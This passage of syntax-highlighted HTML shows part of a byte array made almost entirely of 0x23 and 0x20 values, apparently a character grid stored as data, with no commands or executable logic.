class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span 